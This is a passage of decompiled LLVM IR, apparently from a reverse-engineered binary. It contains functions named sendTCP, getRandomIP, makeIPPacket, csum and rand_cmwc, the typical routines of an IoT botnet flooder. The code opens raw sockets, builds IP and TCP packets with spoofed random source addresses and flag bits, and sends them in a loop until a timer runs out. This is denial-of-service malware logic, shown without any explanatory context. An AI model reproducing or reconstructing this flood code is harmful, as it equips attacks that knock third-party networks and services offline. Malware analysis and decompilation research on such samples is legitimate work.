  %sext7 = mul i32 %storemerge4.in, 65536
  %v4_804b6ae = sdiv i32 %sext7, 65536
  store i32 %v4_804b6ae, i32* %edx.global-to-local, align 4
  %v3_804b6b1 = add i32 %v2_804b5ff, 22
  %v4_804b6b1 = inttoptr i32 %v3_804b6b1 to i16*
  store i16 %storemerge4, i16* %v4_804b6b1, align 2
  %v1_804b6b8 = add i32 %v2_804b5ff, 26
  %v2_804b6b8 = inttoptr i32 %v1_804b6b8 to i16*
  store i16 0, i16* %v2_804b6b8, align 2
  %v1_804b6c1 = add i32 %v2_804b5ff, 28
  store i32 %v1_804b6c1, i32* %eax.global-to-local, align 4
  %v4_804b6c4 = load i32, i32* @esp, align 4
  %v5_804b6c4 = add i32 %v4_804b6c4, -4
  %v6_804b6c4 = inttoptr i32 %v5_804b6c4 to i32*
  store i32 %arg5, i32* %v6_804b6c4, align 4
  %v0_804b6c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b6c7 = add i32 %v4_804b6c4, -8
  %v3_804b6c7 = inttoptr i32 %v2_804b6c7 to i32*
  store i32 %v0_804b6c7, i32* %v3_804b6c7, align 4
  %v3_804b6c8 = inttoptr i32 %v4_804b6ae to i8*
  %v4_804b6c8 = call i32 @makeRandomStr(i8* %v3_804b6c8, i32 %v12_804b3e8)
  %v0_804b6cd = load i32, i32* @esp, align 4
  store i32 %v2_804b5ff, i32* %eax.global-to-local, align 4
  %v1_804b6d3 = or i32 %v2_804b5ff, 2
  %v2_804b6d3 = inttoptr i32 %v1_804b6d3 to i16*
  %v3_804b6d3 = load i16, i16* %v2_804b6d3, align 2
  %v4_804b6d3 = zext i16 %v3_804b6d3 to i32
  store i32 %v4_804b6d3, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5ff, i32* %eax.global-to-local, align 4
  %v2_804b6e2 = add i32 %v0_804b6cd, 4
  %v3_804b6e2 = inttoptr i32 %v2_804b6e2 to i32*
  store i32 %v4_804b6d3, i32* %v3_804b6e2, align 4
  %v0_804b6e3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804b6e3 = inttoptr i32 %v0_804b6cd to i32*
  store i32 %v0_804b6e3, i32* %v3_804b6e3, align 4
  %v3_804b6e4 = inttoptr i32 %v4_804b6ae to i16*
  %v4_804b6e4 = call i32 @csum(i16* %v3_804b6e4, i32 %v12_804b3e8)
  %v5_804b6e4 = trunc i32 %v4_804b6e4 to i16
  %sext10 = mul i32 %v4_804b6e4, 65536
  %v1_804b6ec = sdiv i32 %sext10, 65536
  store i32 %v1_804b6ec, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5ff, i32* %eax.global-to-local, align 4
  %v3_804b6f1 = or i32 %v2_804b5ff, 10
  %v4_804b6f1 = inttoptr i32 %v3_804b6f1 to i16*
  store i16 %v5_804b6e4, i16* %v4_804b6f1, align 2
  %v0_804b6f5 = load i32, i32* @esp, align 4
  %v1_804b6f8 = add i32 %v0_804b6f5, -16
  %v2_804b6f8 = inttoptr i32 %v1_804b6f8 to i32*
  store i32 0, i32* %v2_804b6f8, align 4
  %v2_804b6fa = inttoptr i32 %v4_804b6ae to i32*
  %v3_804b6fa = call i32 @__GI_time(i32* %v2_804b6fa)
  %v0_804b6ff = load i32, i32* @esp, align 4
  %v1_804b6ff = add i32 %v0_804b6ff, 16
  %v5_804b702 = add i32 %v3_804b6fa, %arg3
  store i32 %v5_804b702, i32* %eax.global-to-local, align 4
  %v3_804b779 = or i32 %v2_804b5ff, 4
  %v4_804b779 = inttoptr i32 %v3_804b779 to i16*
  %v2_804b79c = or i32 %v2_804b5ff, 12
  %v3_804b79c = inttoptr i32 %v2_804b79c to i32*
  br label %dec_label_pc_804b711

dec_label_pc_804b711:                             ; preds = %dec_label_pc_804b7cc, %dec_label_pc_804b7ea, %dec_label_pc_804b6ab
  %v0_804b717 = phi i32 [ %v1_804b6ff, %dec_label_pc_804b6ab ], [ %v0_804b717.pre.pre, %dec_label_pc_804b7ea ], [ %v1_804b7d6, %dec_label_pc_804b7cc ]
  %stack_var_-94.0 = phi i16 [ %tmp, %dec_label_pc_804b6ab ], [ %storemerge, %dec_label_pc_804b7ea ], [ %storemerge, %dec_label_pc_804b7cc ]
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_804b6ab ], [ %v4_804b7ea, %dec_label_pc_804b7ea ], [ 0, %dec_label_pc_804b7cc ]
  store i32 %v2_804b41d, i32* %eax.global-to-local, align 4
  store i32 %v2_804b5ff, i32* %edx.global-to-local, align 4
  %v1_804b71a = add i32 %v0_804b717, -12
  %v2_804b71a = inttoptr i32 %v1_804b71a to i32*
  store i32 16, i32* %v2_804b71a, align 4
  %v2_804b71c = add i32 %v0_804b717, -16
  %v3_804b71c = inttoptr i32 %v2_804b71c to i32*
  store i32 %v2_804b41d, i32* %v3_804b71c, align 4
  %v1_804b71d = add i32 %v0_804b717, -20
  %v2_804b71d = inttoptr i32 %v1_804b71d to i32*
  store i32 0, i32* %v2_804b71d, align 4
  %v5_804b71f = add i32 %v0_804b717, -24
  %v6_804b71f = inttoptr i32 %v5_804b71f to i32*
  store i32 %v1_804b5df, i32* %v6_804b71f, align 4
  %v0_804b722 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b722 = add i32 %v0_804b717, -28
  %v3_804b722 = inttoptr i32 %v2_804b722 to i32*
  store i32 %v0_804b722, i32* %v3_804b722, align 4
  %v5_804b723 = add i32 %v0_804b717, -32
  %v6_804b723 = inttoptr i32 %v5_804b723 to i32*
  store i32 %v3_804b537, i32* %v6_804b723, align 4
  %v6_804b726 = call i32 @__libc_sendto(i32 %stack_var_-80.0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804b726, i32* %eax.global-to-local, align 4
  %v1_804b72e = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  %sext2 = mul i32 %v1_804b72e, 65536
  %v1_804b733 = sdiv i32 %sext2, 65536
  store i32 %v1_804b733, i32* %edx.global-to-local, align 4
  store i32 %v1_804b617, i32* %eax.global-to-local, align 4
  %v1_804b738 = trunc i32 %v1_804b733 to i16
  store i16 %v1_804b738, i16* %v5_804b61a, align 4
  br i1 %v1_804b3f5, label %dec_label_pc_804b74c, label %dec_label_pc_804b741

dec_label_pc_804b741:                             ; preds = %dec_label_pc_804b711
  %v1_804b741 = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  br label %dec_label_pc_804b764

dec_label_pc_804b74c:                             ; preds = %dec_label_pc_804b711
  store i32 %v1_804b74f.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804b754 = load i32, i32* @esp, align 4
  %v2_804b757 = add i32 %v0_804b754, -16
  %v3_804b757 = inttoptr i32 %v2_804b757 to i32*
  store i32 %v1_804b74f.pre-phi, i32* %v3_804b757, align 4
  %v1_804b758 = sext i16 %stack_var_-94.0 to i32
  %v2_804b758 = call i32 @htons(i32 %v1_804b758)
  br label %dec_label_pc_804b764

dec_label_pc_804b764:                             ; preds = %dec_label_pc_804b741, %dec_label_pc_804b74c
  %storemerge.in = phi i32 [ %v1_804b741, %dec_label_pc_804b741 ], [ %v2_804b758, %dec_label_pc_804b74c ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b617, i32* %eax.global-to-local, align 4
  %v4_804b767 = urem i32 %storemerge.in, 65536
  %v5_804b767 = load i32, i32* %edx.global-to-local, align 4
  %v6_804b767 = and i32 %v5_804b767, -65536
  %v7_804b767 = or i32 %v6_804b767, %v4_804b767
  store i32 %v7_804b767, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804b6b1, align 2
  %sext12 = mul i32 %storemerge.in, 65536
  %v1_804b76f = sdiv i32 %sext12, 65536
  %v2_804b76f = call i32 @rand_cmwc(i32 %v1_804b76f)
  %sext3 = mul i32 %v2_804b76f, 65536
  %v1_804b774 = sdiv i32 %sext3, 65536
  store i32 %v1_804b774, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5ff, i32* %eax.global-to-local, align 4
  %v1_804b779 = trunc i32 %v1_804b774 to i16
  store i16 %v1_804b779, i16* %v4_804b779, align 4
  %v0_804b77d = load i32, i32* @esp, align 4
  %v5_804b780 = add i32 %v0_804b77d, -16
  %v6_804b780 = inttoptr i32 %v5_804b780 to i32*
  store i32 %storemerge5, i32* %v6_804b780, align 4
  %v3_804b783 = call i32 @getRandomIP(i32 %v1_804b76f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804b783, i32* %eax.global-to-local, align 4
  %v0_804b788 = load i32, i32* @esp, align 4
  %v3_804b78e = inttoptr i32 %v0_804b788 to i32*
  store i32 %v3_804b783, i32* %v3_804b78e, align 4
  %v0_804b78f = call i32 @htonl()
  store i32 %v0_804b78f, i32* %edx.global-to-local, align 4
  store i32 %v0_804b78f, i32* %v3_804b79c, align 4
  store i32 %v2_804b5ff, i32* %eax.global-to-local, align 4
  %v3_804b7a2 = load i16, i16* %v2_804b6d3, align 2
  %v4_804b7a2 = zext i16 %v3_804b7a2 to i32
  store i32 %v4_804b7a2, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5ff, i32* %eax.global-to-local, align 4
  %v1_804b7b1 = load i32, i32* @esp, align 4
  %v2_804b7b1 = add i32 %v1_804b7b1, -4
  %v3_804b7b1 = inttoptr i32 %v2_804b7b1 to i32*
  store i32 %v4_804b7a2, i32* %v3_804b7b1, align 4
  %v0_804b7b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b7b2 = add i32 %v1_804b7b1, -8
  %v3_804b7b2 = inttoptr i32 %v2_804b7b2 to i32*
  store i32 %v0_804b7b2, i32* %v3_804b7b2, align 4
  %v3_804b7b3 = inttoptr i32 %v1_804b76f to i16*
  %v4_804b7b3 = call i32 @csum(i16* %v3_804b7b3, i32 ptrtoint (i32* @0 to i32))
  %v5_804b7b3 = trunc i32 %v4_804b7b3 to i16
  %sext15 = mul i32 %v4_804b7b3, 65536
  %v1_804b7bb = sdiv i32 %sext15, 65536
  store i32 %v1_804b7bb, i32* %edx.global-to-local, align 4
  store i16 %v5_804b7b3, i16* %v4_804b6f1, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804b7c7 = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_804b7ca = icmp eq i1 %v15_804b7c7, false
  br i1 %v1_804b7ca, label %dec_label_pc_804b7ea, label %dec_label_pc_804b7cc

dec_label_pc_804b7cc:                             ; preds = %dec_label_pc_804b764
  %v0_804b7cc = load i32, i32* @esp, align 4
  %v1_804b7cf = add i32 %v0_804b7cc, -16
  %v2_804b7cf = inttoptr i32 %v1_804b7cf to i32*
  store i32 0, i32* %v2_804b7cf, align 4
  %v2_804b7d1 = inttoptr i32 %v1_804b76f to i32*
  %v3_804b7d1 = call i32 @__GI_time(i32* %v2_804b7d1)
  store i32 %v3_804b7d1, i32* %eax.global-to-local, align 4
  %v0_804b7d6 = load i32, i32* @esp, align 4
  %v1_804b7d6 = add i32 %v0_804b7d6, 16
  %v8_804b7dc = icmp sgt i32 %v3_804b7d1, %v5_804b702
  br i1 %v8_804b7dc, label %dec_label_pc_804b7f2, label %dec_label_pc_804b711

dec_label_pc_804b7ea:                             ; preds = %dec_label_pc_804b764
  %v4_804b7ea = add i32 %stack_var_-80.0, 1
  %v0_804b717.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b711

dec_label_pc_804b7f2:                             ; preds = %dec_label_pc_804b7cc, %dec_label_pc_804b54d, %dec_label_pc_804b529
  %v0_804b7fb26 = phi i32 [ %v5_804b564, %dec_label_pc_804b54d ], [ %v3_804b537, %dec_label_pc_804b529 ], [ %v3_804b7d1, %dec_label_pc_804b7cc ]
  br label %dec_label_pc_804b7f5

dec_label_pc_804b7f5:                             ; preds = %dec_label_pc_804b505, %dec_label_pc_804b478, %dec_label_pc_804b45a, %dec_label_pc_804b41a, %dec_label_pc_804b7f2
  %v0_804b7fb = phi i32 [ 0, %dec_label_pc_804b478 ], [ 0, %dec_label_pc_804b45a ], [ %v3_804b427, %dec_label_pc_804b41a ], [ %v0_804b7fb26, %dec_label_pc_804b7f2 ], [ %v2_804b50a, %dec_label_pc_804b505 ]
  store i32 %v0_804b3e7, i32* @ebx, align 4
  store i32 %v0_804b3e6, i32* @edi, align 4
  ret i32 %v0_804b7fb

; uselistorder directives
  uselistorder i32 %v0_804b78f, { 1, 0 }
  uselistorder i32 %v1_804b774, { 1, 0 }
  uselistorder i32 %v1_804b76f, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_804b733, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_804b717, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804b6cd, { 1, 0 }
  uselistorder i32 %v4_804b6ae, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b74f.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804b696, { 2, 1, 0 }
  uselistorder i32 %v1_804b67a, { 1, 0 }
  uselistorder i32 %v1_804b65b, { 1, 0 }
  uselistorder i32 %v2_804b5ff, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804b5d5, { 1, 0 }
  uselistorder i32 %v3_804b537, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %v1_804b480, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804b47b, { 2, 1, 0, 3 }
  uselistorder i32 %v3_804b463, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804b41d, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804b405, { 1, 0 }
  uselistorder i32 %v12_804b3e8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b7f5, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804b764, { 1, 0 }
  uselistorder label %dec_label_pc_804b711, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b6ab, { 1, 0 }
  uselistorder label %dec_label_pc_804b5dc, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_804b57e, { 1, 0 }
  uselistorder label %dec_label_pc_804b505, { 1, 0 }
  uselistorder label %dec_label_pc_804b4d1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b41a, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i16 @__decompiler_undefined_function_4()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804b7ff = load i32, i32* @edi, align 4
  %v0_804b800 = load i32, i32* @esi, align 4
  %v0_804b801 = load i32, i32* @ebx, align 4
  %v15_804b802 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b819 = icmp eq i32 %arg2, 0
  %v1_804b81d = icmp eq i1 %v4_804b819, false
  br i1 %v1_804b81d, label %dec_label_pc_804b82a, label %dec_label_pc_804b81f

dec_label_pc_804b81f:                             ; preds = %entry
  %v1_804b81f = call i32 @rand_cmwc(i32 %v15_804b802)
  store i32 %v1_804b81f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b842

dec_label_pc_804b82a:                             ; preds = %entry
  %v1_804b82d = urem i32 %arg2, 65536
  store i32 %v1_804b82d, i32* %eax.global-to-local, align 4
  %v5_804b832 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b832, i1* %cf.global-to-local, align 1
  %v1_804b836 = call i32 @htons(i32 %v1_804b82d)
  store i32 %v1_804b836, i32* %eax.global-to-local, align 4
  %v0_804b83b = load i32, i32* @esp, align 4
  %v2_804b83b = icmp ugt i32 %v0_804b83b, -17
  store i1 %v2_804b83b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804b842

dec_label_pc_804b842:                             ; preds = %dec_label_pc_804b81f, %dec_label_pc_804b82a
  %v2_804b845 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804b848 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804b848, i1* %cf.global-to-local, align 1
  %v15_804b848 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804b848, i32* %eax.global-to-local, align 4
  %v3_804b84f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804b84f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b857 = icmp eq i32 %v3_804b84f, 0
  br i1 %v1_804b857, label %dec_label_pc_804b860, label %dec_label_pc_804bd57

dec_label_pc_804b860:                             ; preds = %dec_label_pc_804b842
  %v15_804b863 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804b863, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804b873 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804b873, i1* %cf.global-to-local, align 1
  %v3_804b87c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804b87c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b887 = icmp eq i32 %v3_804b87c, 0
  %v1_804b88b = icmp eq i1 %v4_804b887, false
  br i1 %v1_804b88b, label %dec_label_pc_804b892, label %dec_label_pc_804bd57

dec_label_pc_804b892:                             ; preds = %dec_label_pc_804b860
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804b899 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b899, i1* %cf.global-to-local, align 1
  %v2_804b89e = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804b89e, i32* %eax.global-to-local, align 4
  %v5_804b8a9 = call i32 @__GI_setsockopt(i32 %v3_804b87c, i32 0, i32 3, i32 %v2_804b89e, i32 4)
  store i32 %v5_804b8a9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804b8b1 = icmp slt i32 %v5_804b8a9, 0
  %v1_804b8b3 = icmp eq i1 %v2_804b8b1, false
  br i1 %v1_804b8b3, label %dec_label_pc_804b8ba, label %dec_label_pc_804bd57

dec_label_pc_804b8ba:                             ; preds = %dec_label_pc_804b892
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b8ba = icmp eq i32 %arg4, 0
  %v1_804b8be = icmp eq i1 %v4_804b8ba, false
  br i1 %v1_804b8be, label %dec_label_pc_804b8c9, label %dec_label_pc_804b8df

dec_label_pc_804b8c9:                             ; preds = %dec_label_pc_804b8ba
  %v5_804b8d0 = sub i32 32, %arg4
  %v10_804b8d0 = icmp ugt i32 %arg4, 32
  store i1 %v10_804b8d0, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804b8d8 = urem i32 %v5_804b8d0, 32
  %v4_804b8d8 = icmp eq i32 %v2_804b8d8, 0
  br i1 %v4_804b8d8, label %bb102, label %bb

bb:                                               ; preds = %dec_label_pc_804b8c9
  %v5_804b8d8 = shl i32 1, %v2_804b8d8
  store i32 %v5_804b8d8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_804b8c9, %bb
  %v0_804b8da = phi i32 [ 1, %dec_label_pc_804b8c9 ], [ %v5_804b8d8, %bb ]
  %v1_804b8da = sub i32 0, %v0_804b8da
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804b8da, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8df

dec_label_pc_804b8df:                             ; preds = %dec_label_pc_804b8ba, %bb102
  %storemerge12 = phi i32 [ %v1_804b8da, %bb102 ], [ 0, %dec_label_pc_804b8ba ]
  %v1_804b8e2 = add i32 %arg6, 40
  %v1_804b8ee = add i32 %arg6, 70
  %v2_804b8f1 = and i32 %v1_804b8ee, -16
  %v2_804b8f7 = sub i32 %v15_804b802, %v2_804b8f1
  %v1_804b8ff = add i32 %v2_804b8f7, 15
  %v2_804b902 = and i32 %v1_804b8ff, -16
  store i32 %v2_804b902, i32* %edx.global-to-local, align 4
  %v1_804b91a = add i32 %v2_804b902, 20
  %v5_804b91d = inttoptr i32 %v1_804b91a to i16*
  %v1_804b923 = add i32 %arg6, 20
  store i32 %v1_804b923, i32* %eax.global-to-local, align 4
  store i32 %v1_804b923, i32* @ebx, align 4
  %v5_804b928 = icmp ult i32 %v2_804b8f7, 12
  store i1 %v5_804b928, i1* %cf.global-to-local, align 1
  %v5_804b92b = add i32 %v2_804b8f7, -16
  %v6_804b92b = inttoptr i32 %v5_804b92b to i32*
  store i32 %storemerge12, i32* %v6_804b92b, align 4
  %v2_804b92e = call i32 @getRandomIP(i32 %v1_804b8e2, i32 %v2_804b902)
  store i32 %v2_804b92e, i32* %eax.global-to-local, align 4
  %v0_804b933 = load i32, i32* @esp, align 4
  %v1_804b933 = add i32 %v0_804b933, 16
  %v5_804b936 = icmp ult i32 %v1_804b933, 12
  store i1 %v5_804b936, i1* %cf.global-to-local, align 1
  %v3_804b939 = inttoptr i32 %v0_804b933 to i32*
  store i32 %v2_804b92e, i32* %v3_804b939, align 4
  %v0_804b93a = call i32 @htonl()
  store i32 %v0_804b93a, i32* %eax.global-to-local, align 4
  %v0_804b93f = load i32, i32* @esp, align 4
  %v3_804b942 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804b942, i32* %edx.global-to-local, align 4
  %tmp105 = and i32 %v0_804b93f, -4
  %v5_804b945 = icmp eq i32 %tmp105, -16
  store i1 %v5_804b945, i1* %cf.global-to-local, align 1
  %v0_804b948 = load i32, i32* @ebx, align 4
  %v2_804b948 = add i32 %v0_804b93f, 8
  %v3_804b948 = inttoptr i32 %v2_804b948 to i32*
  store i32 %v0_804b948, i32* %v3_804b948, align 4
  %v1_804b949 = add i32 %v0_804b93f, 4
  %v2_804b949 = inttoptr i32 %v1_804b949 to i32*
  store i32 6, i32* %v2_804b949, align 4
  %v3_804b94b = inttoptr i32 %v0_804b93f to i32*
  store i32 %v0_804b93a, i32* %v3_804b94b, align 4
  %v0_804b94c = load i32, i32* %edx.global-to-local, align 4
  %v2_804b94c = add i32 %v0_804b93f, -4
  %v3_804b94c = inttoptr i32 %v2_804b94c to i32*
  store i32 %v0_804b94c, i32* %v3_804b94c, align 4
  %v5_804b94d = add i32 %v0_804b93f, -8
  %v6_804b94d = inttoptr i32 %v5_804b94d to i32*
  store i32 %v2_804b902, i32* %v6_804b94d, align 4
  %v0_804b950 = call i32 @makeIPPacket()
  store i32 %v0_804b950, i32* %eax.global-to-local, align 4
  %v0_804b955 = load i32, i32* @esp, align 4
  %v5_804b955 = icmp ugt i32 %v0_804b955, -25
  store i1 %v5_804b955, i1* %cf.global-to-local, align 1
  %v2_804b958 = call i32 @rand_cmwc(i32 %v1_804b91a)
  %sext = mul i32 %v2_804b958, 65536
  %v1_804b95d = sdiv i32 %sext, 65536
  store i32 %v1_804b95d, i32* %edx.global-to-local, align 4
  store i32 %v1_804b91a, i32* %eax.global-to-local, align 4
  %v1_804b962 = trunc i32 %v1_804b95d to i16
  store i16 %v1_804b962, i16* %v5_804b91d, align 4
  %v2_804b965 = call i32 @rand_cmwc(i32 %v1_804b91a)
  %v2_804b96f = add i32 %v2_804b902, 24
  %v3_804b96f = inttoptr i32 %v2_804b96f to i32*
  store i32 %v2_804b965, i32* %v3_804b96f, align 8
  store i32 %v1_804b91a, i32* %eax.global-to-local, align 4
  %v1_804b975 = add i32 %v2_804b902, 28
  %v2_804b975 = inttoptr i32 %v1_804b975 to i32*
  store i32 0, i32* %v2_804b975, align 4
  store i32 %v1_804b91a, i32* %edx.global-to-local, align 4
  %v1_804b97f = add i32 %v2_804b902, 32
  %v2_804b97f = inttoptr i32 %v1_804b97f to i8*
  %v3_804b97f = load i8, i8* %v2_804b97f, align 16
  %v1_804b982 = urem i8 %v3_804b97f, 16
  %v1_804b985 = or i8 %v1_804b982, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804b985, i8* %v2_804b97f, align 16
  %v4_804b98b = ptrtoint i8* %arg5 to i32
  store i32 %v4_804b98b, i32* %eax.global-to-local, align 4
  store i32 %v4_804b98b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80529d0.46 to i32), i32* @edi, align 4
  %v6_804b9a9 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529d0.46, i32 0, i32 0), i32 4)
  %v7_804b9a9 = urem i32 %v6_804b9a9, 2
  %v8_804b9a9 = icmp eq i32 %v7_804b9a9, 0
  %v0_804b9ab = load i1, i1* %cf.global-to-local, align 1
  %v2_804b9ab = or i1 %v0_804b9ab, %v8_804b9a9
  %v3_804b9ab = zext i1 %v2_804b9ab to i32
  %v4_804b9ab = load i32, i32* %edx.global-to-local, align 4
  %v5_804b9ab = and i32 %v4_804b9ab, -256
  %v6_804b9ab = or i32 %v3_804b9ab, %v5_804b9ab
  %v7_804b9ab = xor i32 %v6_804b9ab, 1
  store i32 %v7_804b9ab, i32* @edx, align 4
  %v3_804b9b1 = and i32 %v6_804b9a9, -256
  %v1_804b9b3 = trunc i32 %v7_804b9ab to i8
  %v3_804b9b3 = zext i1 %v0_804b9ab to i8
  %v4_804b9b3 = sub nsw i8 %v1_804b9b3, %v3_804b9b3
  %v15_804b9b3 = icmp eq i8 %v4_804b9b3, 0
  %v20_804b9b3 = zext i8 %v4_804b9b3 to i32
  %v23_804b9b3 = or i32 %v20_804b9b3, %v3_804b9b1
  store i32 %v23_804b9b3, i32* @ecx, align 4
  %v2_804b9b7 = sext i8 %v4_804b9b3 to i32
  store i32 %v2_804b9b7, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b9bc = icmp eq i1 %v15_804b9b3, false
  br i1 %v1_804b9bc, label %dec_label_pc_804b9ff, label %dec_label_pc_804b9be

dec_label_pc_804b9be:                             ; preds = %dec_label_pc_804b8df
  store i32 %v1_804b91a, i32* %edx.global-to-local, align 4
  %v1_804b9c1 = add i32 %v2_804b902, 33
  %v2_804b9c1 = inttoptr i32 %v1_804b9c1 to i8*
  %v3_804b9c1 = load i8, i8* %v2_804b9c1, align 1
  %v4_804b9c1 = zext i8 %v3_804b9c1 to i32
  %v6_804b9c1 = and i32 %v2_804b9b7, -256
  %v7_804b9c1 = or i32 %v6_804b9c1, %v4_804b9c1
  %v1_804b9c4 = or i32 %v7_804b9c1, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9c4 = trunc i32 %v1_804b9c4 to i8
  store i32 %v1_804b9c4, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9c4, i8* %v2_804b9c1, align 1
  store i32 %v1_804b91a, i32* %edx.global-to-local, align 4
  %v3_804b9cd = load i8, i8* %v2_804b9c1, align 1
  %v4_804b9cd = zext i8 %v3_804b9cd to i32
  %v5_804b9cd = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9cd = and i32 %v5_804b9cd, -256
  %v7_804b9cd = or i32 %v4_804b9cd, %v6_804b9cd
  %v1_804b9d0 = or i32 %v7_804b9cd, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9d0 = trunc i32 %v1_804b9d0 to i8
  store i32 %v1_804b9d0, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9d0, i8* %v2_804b9c1, align 1
  store i32 %v1_804b91a, i32* %edx.global-to-local, align 4
  %v3_804b9d9 = load i8, i8* %v2_804b9c1, align 1
  %v4_804b9d9 = zext i8 %v3_804b9d9 to i32
  %v5_804b9d9 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9d9 = and i32 %v5_804b9d9, -256
  %v7_804b9d9 = or i32 %v4_804b9d9, %v6_804b9d9
  %v1_804b9dc = or i32 %v7_804b9d9, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9dc = trunc i32 %v1_804b9dc to i8
  store i32 %v1_804b9dc, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9dc, i8* %v2_804b9c1, align 1
  store i32 %v1_804b91a, i32* %edx.global-to-local, align 4
  %v3_804b9e5 = load i8, i8* %v2_804b9c1, align 1
